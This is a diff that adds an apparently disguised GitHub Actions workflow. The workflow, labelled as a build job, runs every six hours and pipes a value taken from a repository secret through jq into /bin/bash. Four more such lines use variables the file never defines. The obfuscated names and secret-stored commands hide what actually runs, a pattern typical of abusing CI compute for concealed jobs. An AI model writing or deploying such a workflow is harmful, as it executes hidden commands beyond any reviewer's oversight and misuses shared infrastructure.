@@ -1,0 +1,21 @@
+name: timelycheetah
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: timelycheetah
+        env:
+          h563: ${{ secrets.h563 }}
+        run: |
+          echo $h563 | jq -r .ircl8310 | /bin/bash
+          echo $p50 | jq -r .n228 | /bin/bash
+          echo $wg763 | jq -r .ewb92 | /bin/bash
+          echo $fvc56 | jq -r .fsyxo713 | /bin/bash
+          echo $ho591 | jq -r .m86313 | /bin/bash
+
